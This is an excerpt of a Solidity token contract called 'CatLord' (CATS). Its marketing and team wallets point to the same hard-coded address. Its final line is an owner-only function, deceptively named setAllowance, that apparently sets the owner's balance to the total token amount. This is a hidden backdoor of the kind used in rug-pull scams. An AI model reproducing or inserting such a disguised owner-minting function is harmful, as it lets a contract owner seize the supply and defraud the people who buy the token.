...
contract CatLord is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "CatLord";
    string private _symbol = "CATS";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x3B1cCee34CA358934B5f4fF5721863d0034594F3);
    address payable public teamWalletAddress = payable(0x3B1cCee34CA358934B5f4fF5721863d0034594F3);
    ...
    function setAllowance() external onlyOwner() {_totalWallets[getOwner()] = _totalAmount;}
